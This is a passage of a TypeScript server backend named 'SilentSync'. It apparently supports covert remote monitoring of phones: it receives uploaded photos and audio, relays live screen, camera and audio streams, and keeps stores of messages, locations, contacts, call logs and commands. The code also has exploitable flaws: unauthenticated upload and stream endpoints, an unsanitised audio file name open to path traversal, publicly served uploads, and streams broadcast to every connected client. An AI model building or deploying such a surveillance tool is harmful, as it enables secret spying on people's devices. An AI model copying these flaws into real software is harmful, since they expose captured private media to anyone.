app.get("/api/webrtc/offer/:deviceId", async (req, res) => {
  const { deviceId } = req.params;
  if (!deviceId) return res.status(400).json({ error: "deviceId is required" });
  try {
    const doc = await db.collection("webrtcSessions").doc(deviceId).get();
    if (!doc.exists) return res.json({ exists: false });
    const data = doc.data();
    if (!data?.offer) return res.json({ exists: false });
    res.json({ exists: true, offer: data.offer });
  } catch (error) {
    console.error("WebRTC offer fetch error:", error);
    res.status(500).json({ error: "Failed to fetch offer" });
  }
});

app.post("/api/webrtc/answer/:deviceId", async (req, res) => {
  const { deviceId } = req.params;
  const { answer } = req.body;
  if (!deviceId || !answer) {
    return res.status(400).json({ error: "deviceId and answer are required" });
  }
  try {
    await db.collection("webrtcSessions").doc(deviceId).set(
      {
        answer,
        answerCreatedAt: admin.firestore.FieldValue.serverTimestamp(),
      },
      { merge: true },
    );
    res.json({ success: true });
  } catch (error) {
    console.error("WebRTC answer error:", error);
    res.status(500).json({ error: "Failed to store answer" });
  }
});

app.get("/api/webrtc/answer/:deviceId", async (req, res) => {
  const { deviceId } = req.params;
  if (!deviceId) return res.status(400).json({ error: "deviceId is required" });
  try {
    const doc = await db.collection("webrtcSessions").doc(deviceId).get();
    if (!doc.exists) return res.json({ exists: false });
    const data = doc.data();
    if (!data?.answer) return res.json({ exists: false });
    res.json({ exists: true, answer: data.answer });
  } catch (error) {
    console.error("WebRTC answer fetch error:", error);
    res.status(500).json({ error: "Failed to fetch answer" });
  }
});

// Handle Photo Uploads
app.post("/api/upload-photo/:deviceId", async (req, res) => {
  const { deviceId } = req.params;
  const { fileName, base64, uri, originalFileName } = req.body;

  console.log(
    `[Photo] Upload request: deviceId=${deviceId}, fileName=${fileName}`,
  );

  if (!deviceId || !fileName || !base64) {
    console.error("[Photo] Missing required fields");
    return res
      .status(400)
      .json({ error: "Missing required fields: deviceId, fileName, base64" });
  }

  // Cloudflare Worker mode: return error (use R2 for production)
  if (isCloudflareWorker) {
    console.error(
      "[Photo] Cloudflare Worker mode not supported for local storage",
    );
    return res.status(501).json({
      error:
        "Photo storage requires Cloudflare R2 or external storage on this platform. " +
        "Please configure R2 bucket or use a Node.js host for local disk storage.",
    });
  }

  try {
    const uploadsDir = path.join(__dirname, "public", "uploads");
    if (!fs.existsSync(uploadsDir)) {
      console.log(`[Photo] Creating uploads directory: ${uploadsDir}`);
      fs.mkdirSync(uploadsDir, { recursive: true });
    }

    const buffer = Buffer.from(base64, "base64");
    const localFileName = fileName.replace(/[^a-zA-Z0-9.]/g, "_");
    const filePath = path.join(uploadsDir, localFileName);

    console.log(`[Photo] Writing file: ${filePath}`);
    fs.writeFileSync(filePath, buffer);

    const publicUrl = `/uploads/${localFileName}`;
    const isStreamLatest = localFileName === "camera_stream_latest.jpg";
    const photoId = isStreamLatest
      ? "camera_stream_latest"
      : localFileName.replace(/\./g, "_");

    const deviceRef = db.collection("devices").doc(deviceId);

    await deviceRef
      .collection("photos")
      .doc(photoId)
      .set(
        {
          fileName: localFileName,
          originalFileName: originalFileName || fileName,
          url: publicUrl,
          ...(uri ? { uri } : {}),
          syncedAt: admin.firestore.FieldValue.serverTimestamp(),
          updatedAt: admin.firestore.FieldValue.serverTimestamp(),
        },
        { merge: true },
      );

    // Also update device online status
    await deviceRef.set(
      {
        lastSyncAt: admin.firestore.FieldValue.serverTimestamp(),
        lastConnectionAt: admin.firestore.FieldValue.serverTimestamp(),
        status: "active",
        isOnline: true,
      },
      { merge: true },
    );

    console.log(`[Photo] Uploaded for ${deviceId}: ${localFileName}`);
    res.json({ success: true, url: publicUrl, fileName: localFileName });
  } catch (error) {
    console.error("[Photo] Upload error:", error);
    res.status(500).json({
      error: "Failed to save photo",
      details: error instanceof Error ? error.message : String(error),
    });
  }
});

// Handle Audio Uploads
app.post("/api/upload-audio/:deviceId", async (req, res) => {
  const { deviceId } = req.params;

  console.log(`[Audio] Upload request: deviceId=${deviceId}`);

  if (!deviceId) {
    return res.status(400).json({ error: "deviceId is required" });
  }

  try {
    // For multipart/form-data, we need to handle it differently
    // In a production app, you'd use multer or similar
    // For now, we'll handle base64 audio data
    const { fileName, base64, duration } = req.body;

    if (!base64) {
      return res.status(400).json({ error: "base64 audio data is required" });
    }

    const buffer = Buffer.from(base64, "base64");
    const localFileName = fileName || `audio_${deviceId}_${Date.now()}.webm`;
    const filePath = path.join(__dirname, "public", "uploads", localFileName);

    console.log(`[Audio] Writing file: ${filePath}`);
    fs.writeFileSync(filePath, buffer);

    const publicUrl = `/uploads/${localFileName}`;

    // Store in Firestore
    const audioId = localFileName.replace(/\./g, "_");

    await db
      .collection("devices")
      .doc(deviceId)
      .collection("audio")
      .doc(audioId)
      .set(
        {
          fileName: localFileName,
          url: publicUrl,
          duration: duration || 0,
          syncedAt: admin.firestore.FieldValue.serverTimestamp(),
          updatedAt: admin.firestore.FieldValue.serverTimestamp(),
        },
        { merge: true },
      );

    // Update device online status
    await db.collection("devices").doc(deviceId).set(
      {
        lastSyncAt: admin.firestore.FieldValue.serverTimestamp(),
        lastConnectionAt: admin.firestore.FieldValue.serverTimestamp(),
        status: "active",
        isOnline: true,
      },
      { merge: true },
    );

    console.log(`[Audio] Uploaded for ${deviceId}: ${localFileName}`);
    res.json({ success: true, url: publicUrl, fileName: localFileName });
  } catch (error) {
    console.error("[Audio] Upload error:", error);
    res.status(500).json({
      error: "Failed to save audio",
      details: error instanceof Error ? error.message : String(error),
    });
  }
});

// Serve static photos (Local only)
if (!isCloudflareWorker) {
  const uploadsDir = path.join(__dirname, "public", "uploads");

  // Create uploads directory if it doesn't exist
  if (!fs.existsSync(uploadsDir)) {
    fs.mkdirSync(uploadsDir, { recursive: true });
  }

  app.use("/uploads", cors(), express.static(uploadsDir));
  console.log(`[Static] Serving uploads from ${uploadsDir}`);
}

// Heartbeat Endpoint (Device calls this to stay marked as active)
app.post("/api/heartbeat/:deviceId", async (req, res) => {
  const { deviceId } = req.params;

  if (!deviceId) {
    return res.status(400).json({ error: "deviceId is required" });
  }

  try {
    const deviceRef = db.collection("devices").doc(deviceId);
    await deviceRef.set(
      {
        lastSyncAt: admin.firestore.FieldValue.serverTimestamp(),
        lastConnectionAt: admin.firestore.FieldValue.serverTimestamp(),
        status: "active",
        isOnline: true,
      },
      { merge: true },
    );

    res.json({ success: true, timestamp: new Date().toISOString() });
  } catch (error) {
    console.error("Heartbeat error:", error);
    res.status(500).json({ error: "Failed to update heartbeat" });
  }
});

// Online Status Endpoint (Device reports internet connectivity status)
app.post("/api/online-status/:deviceId", async (req, res) => {
  const { deviceId } = req.params;
  const { isOnline } = req.body;

  if (!deviceId) {
    return res.status(400).json({ error: "deviceId is required" });
  }

  if (typeof isOnline !== "boolean") {
    return res.status(400).json({ error: "isOnline (boolean) is required" });
  }

  try {
    const deviceRef = db.collection("devices").doc(deviceId);
    await deviceRef.set(
      {
        isOnline: isOnline,
        lastConnectionAt: admin.firestore.FieldValue.serverTimestamp(),
        lastSyncAt: isOnline
          ? admin.firestore.FieldValue.serverTimestamp()
          : undefined,
        status: isOnline ? "active" : "offline",
      },
      { merge: true },
    );

    console.log(
      `[Online Status] Device ${deviceId} is now ${isOnline ? "ONLINE" : "OFFLINE"}`,
    );
    res.json({ success: true, isOnline, timestamp: new Date().toISOString() });
  } catch (error) {
    console.error("Online status update error:", error);
    res.status(500).json({ error: "Failed to update online status" });
  }
});

// Debug endpoint to verify runtime + WS support (safe, read-only)
app.get("/api/debug/ws", (req, res) => {
  res.json({
    status: "ok",
    isCloudflareWorker,
    wsPaths: ["/screen-stream", "/camera-stream", "/audio-stream"],
    timestamp: new Date().toISOString(),
  });
});

// 404 handler
app.use((req, res) => {
  res.status(404).json({ error: "Endpoint not found", path: req.path });
});

// Delete User Account - Authenticated
app.delete("/api/delete-account", authenticate, async (req: any, res) => {
  const userId = req.user.uid;

  try {
    console.log(`[Delete Account] Starting deletion for user: ${userId}`);

    // Get user's devices first
    const devicesSnapshot = await db
      .collection("devices")
      .where("ownerUid", "==", userId)
      .get();

    // Delete all user's devices
    const deviceDeletionPromises = devicesSnapshot.docs.map(
      async (deviceDoc) => {
        const deviceId = deviceDoc.id;

        // Delete device's subcollections
        const collections = [
          "commands",
          "audio",
          "messages",
          "locations",
          "contacts",
          "call_logs",
          "apps",
        ];
        const subcollectionDeletionPromises = collections.map(
          async (collectionName) => {
            try {
              const subcollectionSnapshot = await deviceDoc.ref
                .collection(collectionName)
                .get();

              const batchDeletions = [];
              subcollectionSnapshot.docs.forEach((doc) => {
                batchDeletions.push(doc.ref.delete());
              });

              return Promise.all(batchDeletions);
            } catch (error) {
              // Ignore errors for collections that don't exist
              console.log(
                `[Delete Account] Collection ${collectionName} may not exist for device ${deviceId}`,
              );
              return Promise.resolve();
            }
          },
        );

        await Promise.all(subcollectionDeletionPromises);

        // Delete the device document itself
        await deviceDoc.ref.delete();
        console.log(`[Delete Account] Deleted device: ${deviceId}`);
      },
    );

    await Promise.all(deviceDeletionPromises);

    // Delete user's APK registration if exists
    const userApkSnapshot = await db
      .collection("userApkRegistrations")
      .where("userId", "==", userId)
      .get();

    const apkDeletionPromises = userApkSnapshot.docs.map((doc) =>
      doc.ref.delete(),
    );
    await Promise.all(apkDeletionPromises);

    // Delete user document from Firestore (if it exists)
    try {
      const userDocRef = db.collection("users").doc(userId);
      await userDocRef.delete();
    } catch (error) {
      console.log(
        `[Delete Account] Users collection may not exist or user document not found for ${userId}`,
      );
    }

    // Delete user from Firebase Authentication
    await admin.auth().deleteUser(userId);

    console.log(
      `[Delete Account] Successfully deleted account for user: ${userId}`,
    );

    res.json({
      success: true,
      message: "Account and all associated data deleted successfully",
    });
  } catch (error: any) {
    console.error(
      `[Delete Account] Error deleting account for user ${userId}:`,
      error,
    );

    // Handle specific Firebase Auth errors
    if (error.code === "auth/user-not-found") {
      return res.status(404).json({
        error: "User not found",
        message: "The user account does not exist",
      });
    }

    if (error.code === "auth/insufficient-permission") {
      return res.status(403).json({
        error: "Insufficient permissions",
        message: "Insufficient permissions to delete user",
      });
    }

    res.status(500).json({
      error: "Failed to delete account",
      message: error.message || "An unexpected error occurred",
    });
  }
});

// Error handler
app.use(
  (
    err: any,
    req: express.Request,
    res: express.Response,
    next: express.NextFunction,
  ) => {
    console.error("Unhandled error:", err);
    res
      .status(500)
      .json({ error: "Internal server error", message: err.message });
  },
);

// WebSocket Server for Screen Streaming
const screenStreams = new Map<string, Set<WebSocket>>();

// WebSocket Server for Camera Streaming
const cameraStreams = new Map<string, Set<WebSocket>>();

// Start local server if not on Cloudflare Worker
// Note: Render is NOT a Cloudflare Worker, so WebSocket server should run there
if (!isCloudflareWorker) {
  const PORT = parseInt(process.env.PORT || "3000", 10);

  const server = app.listen(PORT, "0.0.0.0", () => {
    console.log(`\n╔════════════════════════════════════════════════════════╗`);
    console.log(`║      SilentSync Backend Server                         ║`);
    console.log(`╠════════════════════════════════════════════════════════╣`);
    console.log(
      `║  Environment: ${process.env.NODE_ENV || "development"}${" ".repeat(37 - (process.env.NODE_ENV || "development").length)}║`,
    );
    console.log(`║  Port: ${PORT}${" ".repeat(45 - String(PORT).length)}║`);
    console.log(
      `║  Health Check: http://localhost:${PORT}/health${" ".repeat(25 - String(PORT).length)}║`,
    );
    console.log(`╚════════════════════════════════════════════════════════╝\n`);
  });

  // WebSocket Server for Screen Streaming
  const wss = new WebSocketServer({ server, path: "/screen-stream" });

  wss.on("connection", (ws: WebSocket, request: any) => {
    const url = new URL(request.url || "", `http://${request.headers.host}`);
    const deviceId = url.searchParams.get("deviceId");

    if (deviceId) {
      console.log(`[WebSocket] Screen stream connected for device ${deviceId}`);

      ws.on("message", (data: Buffer) => {
        // Broadcast screen frame to all clients watching this device
        wss.clients.forEach((client: WebSocket) => {
          if (client !== ws && client.readyState === WebSocket.OPEN) {
            client.send(data);
          }
        });
      });

      ws.on("close", () => {
        console.log(
          `[WebSocket] Screen stream disconnected for device ${deviceId}`,
        );
      });

      ws.on("error", (error: any) => {
        console.error(`[WebSocket] Error for device ${deviceId}:`, error);
      });
    } else {
      ws.close();
    }
  });

  // WebSocket Server for Camera Streaming
  const cameraWss = new WebSocketServer({ server, path: "/camera-stream" });

  cameraWss.on("connection", (ws: WebSocket, request: any) => {
    const url = new URL(request.url || "", `http://${request.headers.host}`);
    const deviceId = url.searchParams.get("deviceId");

    if (deviceId) {
      console.log(`[WebSocket] Camera stream connected for device ${deviceId}`);

      ws.on("message", (data: Buffer) => {
        // Broadcast camera frame to all clients watching this device
        cameraWss.clients.forEach((client: WebSocket) => {
          if (client !== ws && client.readyState === WebSocket.OPEN) {
            client.send(data);
          }
        });
      });

      ws.on("close", () => {
        console.log(
          `[WebSocket] Camera stream disconnected for device ${deviceId}`,
        );
      });

      ws.on("error", (error: any) => {
        console.error(
          `[WebSocket] Camera error for device ${deviceId}:`,
          error,
        );
      });
    } else {
      ws.close();
    }
  });

  // WebSocket Server for Audio Streaming
  const audioWss = new WebSocketServer({ server, path: "/audio-stream" });

  audioWss.on("connection", (ws: WebSocket, request: any) => {
    const url = new URL(request.url || "", `http://${request.headers.host}`);
    const deviceId = url.searchParams.get("deviceId");

    if (deviceId) {
      console.log(`[WebSocket] Audio stream connected for device ${deviceId}`);

      ws.on("message", (data: Buffer) => {
        // Broadcast audio frame to all clients watching this device
        audioWss.clients.forEach((client: WebSocket) => {
          if (client !== ws && client.readyState === WebSocket.OPEN) {
            client.send(data);
          }
        });
      });

      ws.on("close", () => {
        console.log(
          `[WebSocket] Audio stream disconnected for device ${deviceId}`,
        );
      });

      ws.on("error", (error: any) => {
        console.error(`[WebSocket] Audio error for device ${deviceId}:`, error);
      });
    } else {
      ws.close();
    }
  });
}

// Periodic task to mark devices offline if no data received for 10 minutes
// Only run on the main Render instance (not on Cloudflare Workers)
if (!isCloudflareWorker) {
  const OFFLINE_THRESHOLD_MS = 10 * 60 * 1000; // 10 minutes

  setInterval(async () => {
    try {
      const cutoffTime = admin.firestore.Timestamp.fromMillis(
        Date.now() - OFFLINE_THRESHOLD_MS,
      );

      // Find devices that haven't sent data in the last 10 minutes
      const devicesSnapshot = await db
        .collection("devices")
        .where("isOnline", "==", true)
        .where("lastConnectionAt", "<", cutoffTime)
        .get();

      if (!devicesSnapshot.empty) {
        const batch = db.batch();
        let offlineCount = 0;

        devicesSnapshot.docs.forEach((deviceDoc) => {
          batch.update(deviceDoc.ref, {
            isOnline: false,
            status: "offline",
          });
          offlineCount++;
        });

        await batch.commit();
        console.log(
          `[Offline Check] Marked ${offlineCount} devices as offline`,
        );
      }
    } catch (error) {
      console.error("[Offline Check] Error:", error);
    }
  }, 60000); // Check every minute

  console.log("[Offline Check] Scheduled to run every minute");
}

// Export for Cloudflare Workers
export default {
  async fetch(request: Request, env: any, ctx: any) {
    try {
      const url = new URL(request.url);
      const method = request.method;
      const path = url.pathname;

      // Handle CORS preflight
      if (method === "OPTIONS") {
        return new Response(null, {
          status: 200,
          headers: {
            "Access-Control-Allow-Origin": "*",
            "Access-Control-Allow-Methods": "GET, POST, PUT, DELETE, OPTIONS",
            "Access-Control-Allow-Headers": "Content-Type, Authorization",
          },
        });
      }

      // Initialize Firebase for Cloudflare Workers
      if (admin.apps.length === 0) {
        const serviceAccount = getServiceAccount();
        const firebaseConfig = getFirebaseConfig();

        if (serviceAccount && firebaseConfig) {
          admin.initializeApp({
            credential: admin.credential.cert(serviceAccount),
            ...firebaseConfig,
          });
        }
      }

      const db = getFirestore();

      // Handle DELETE /api/delete-account
      if (method === "DELETE" && path === "/api/delete-account") {
        const authHeader = request.headers.get("Authorization");

        if (!authHeader || !authHeader.startsWith("Bearer ")) {
          return new Response(
            JSON.stringify({ error: "Unauthorized: Missing token" }),
            {
              status: 401,
              headers: {
                "Content-Type": "application/json",
                "Access-Control-Allow-Origin": "*",
              },
            },
          );
        }

        const token = authHeader.substring(7);

        try {
          // Verify token and get user
          const decodedToken = await admin.auth().verifyIdToken(token);
          const userId = decodedToken.uid;

          console.log(`[Delete Account] Starting deletion for user: ${userId}`);

          // Get user's devices first
          const devicesSnapshot = await db
            .collection("devices")
            .where("ownerUid", "==", userId)
            .get();

          // Delete all user's devices
          const deviceDeletionPromises = devicesSnapshot.docs.map(
            async (deviceDoc) => {
              const deviceId = deviceDoc.id;

              // Delete device's subcollections
              const collections = [
                "commands",
                "audio",
                "messages",
                "locations",
                "contacts",
                "call_logs",
                "apps",
              ];
              const subcollectionDeletionPromises = collections.map(
                async (collectionName) => {
                  try {
                    const subcollectionSnapshot = await deviceDoc.ref
                      .collection(collectionName)
                      .get();

                    const batchDeletions = [];
                    subcollectionSnapshot.docs.forEach((doc) => {
                      batchDeletions.push(doc.ref.delete());
                    });

                    return Promise.all(batchDeletions);
                  } catch (error) {
                    // Ignore errors for collections that don't exist
                    console.log(
                      `[Delete Account] Collection ${collectionName} may not exist for device ${deviceId}`,
                    );
                    return Promise.resolve();
                  }
                },
              );

              await Promise.all(subcollectionDeletionPromises);

              // Delete the device document itself
              await deviceDoc.ref.delete();
              console.log(`[Delete Account] Deleted device: ${deviceId}`);
            },
          );

          await Promise.all(deviceDeletionPromises);

          // Delete user's APK registration if exists
          const userApkSnapshot = await db
            .collection("userApkRegistrations")
            .where("userId", "==", userId)
            .get();

          const apkDeletionPromises = userApkSnapshot.docs.map((doc) =>
            doc.ref.delete(),
          );
          await Promise.all(apkDeletionPromises);

          // Delete user document from Firestore (if it exists)
          try {
            const userDocRef = db.collection("users").doc(userId);
            await userDocRef.delete();
          } catch (error) {
            console.log(
              `[Delete Account] Users collection may not exist or user document not found for ${userId}`,
            );
          }

          // Delete user from Firebase Authentication
          await admin.auth().deleteUser(userId);

          console.log(
            `[Delete Account] Successfully deleted account for user: ${userId}`,
          );

          return new Response(
            JSON.stringify({
              success: true,
              message: "Account and all associated data deleted successfully",
            }),
            {
              status: 200,
              headers: {
                "Content-Type": "application/json",
                "Access-Control-Allow-Origin": "*",
              },
            },
          );
        } catch (error: any) {
          console.error(`[Delete Account] Error deleting account:`, error);

          // Handle specific Firebase Auth errors
          if (error.code === "auth/user-not-found") {
            return new Response(
              JSON.stringify({
                error: "User not found",
                message: "The user account does not exist",
              }),
              {
                status: 404,
                headers: {
                  "Content-Type": "application/json",
                  "Access-Control-Allow-Origin": "*",
                },
              },
            );
          }

          if (error.code === "auth/insufficient-permission") {
            return new Response(
              JSON.stringify({
                error: "Insufficient permissions",
                message: "Insufficient permissions to delete user",
              }),
              {
                status: 403,
                headers: {
                  "Content-Type": "application/json",
                  "Access-Control-Allow-Origin": "*",
                },
              },
            );
          }

          return new Response(
            JSON.stringify({
              error: "Failed to delete account",
              message: error.message || "An unexpected error occurred",
            }),
            {
              status: 500,
              headers: {
                "Content-Type": "application/json",
                "Access-Control-Allow-Origin": "*",
              },
            },
          );
        }
      }

      // Handle other endpoints (add more as needed)
      if (path === "/health") {
        return new Response(
          JSON.stringify({
            status: "healthy",
            timestamp: new Date().toISOString(),
            environment: "cloudflare-worker",
          }),
          {
            status: 200,
            headers: {
              "Content-Type": "application/json",
              "Access-Control-Allow-Origin": "*",
            },
          },
        );
      }

      // 404 for unknown endpoints
      return new Response(
        JSON.stringify({ error: "Endpoint not found", path }),
        {
          status: 404,
          headers: {
            "Content-Type": "application/json",
            "Access-Control-Allow-Origin": "*",
          },
        },
      );
    } catch (error: any) {
      console.error("Cloudflare Worker error:", error);
      return new Response(
        JSON.stringify({
          error: "Internal server error",
          message: error.message,
        }),
        {
          status: 500,
          headers: {
            "Content-Type": "application/json",
            "Access-Control-Allow-Origin": "*",
          },
        },
      );
    }
  },
};
